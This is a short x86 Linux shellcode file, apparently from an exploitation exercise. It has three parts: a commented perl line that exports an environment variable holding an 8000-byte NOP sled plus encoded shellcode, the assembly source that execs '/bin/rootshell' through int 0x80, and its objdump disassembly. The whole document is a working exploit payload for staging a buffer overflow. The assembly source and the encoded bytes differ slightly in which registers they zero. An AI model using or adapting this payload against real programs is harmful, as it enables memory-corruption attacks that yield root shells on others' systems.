# export SHELLCODE=$(perl -e 'print "\x90" x 8000, "\x55\x89\xe5\x68\x6c\x6c\x20\x20\x68\x74\x73\x68\x65\x68\x2f\x72\x6f\x6f\x68\x2f\x62\x69\x6e\x31\xc9\x88\x4d\xfe\x31\xc0\xb0\x0b\x8d\x5d\xf0\x31\xff\x31\xf6\xcd\x80\xeb\xfe"')

shellcode:
	push	%ebp
	movl	%esp,%ebp

	push	$0x20206c6c
	push	$0x65687374
	push	$0x6f6f722f
	push	$0x6e69622f

	xorl	%ecx, %ecx
	movb 	%cl, -2(%ebp)

	# system calls
	xorl	%eax, %eax
	movb	$11, %al
	leal	-16(%ebp), %ebx
	xorl	%ecx, %ecx
	xorl	%edx, %edx
	int	$0x80
loop: jmp loop

.globl _start
_start:
	call main
main:
	call shellcode

# jshellcode:     file format elf32-i386


# Disassembly of section .text:

# 08048098 <shellcode>:
#  8048098:	55                   	push   %ebp
#  8048099:	89 e5                	mov    %esp,%ebp
#  804809b:	68 6c 6c 20 20       	push   $0x20206c6c
#  80480a0:	68 74 73 68 65       	push   $0x65687374
#  80480a5:	68 2f 72 6f 6f       	push   $0x6f6f722f
#  80480aa:	68 2f 62 69 6e       	push   $0x6e69622f
#  80480af:	31 c9                	xor    %ecx,%ecx
#  80480b1:	88 4d fe             	mov    %cl,-0x2(%ebp)
#  80480b4:	31 c0                	xor    %eax,%eax
#  80480b6:	b0 0b                	mov    $0xb,%al
#  80480b8:	8d 5d f0             	lea    -0x10(%ebp),%ebx
#  80480bb:	31 ff                	xor    %edi,%edi
#  80480bd:	31 f6                	xor    %esi,%esi
#  80480bf:	cd 80                	int    $0x80

# 080480c1 <loop>:
#  80480c1:	eb fe                	jmp    80480c1 <loop>

# 080480c3 <_start>:
#  80480c3:	e8 00 00 00 00       	call   80480c8 <main>

# 080480c8 <main>:
#  80480c8:	e8 cb ff ff ff       	call   8048098 <shellcode>
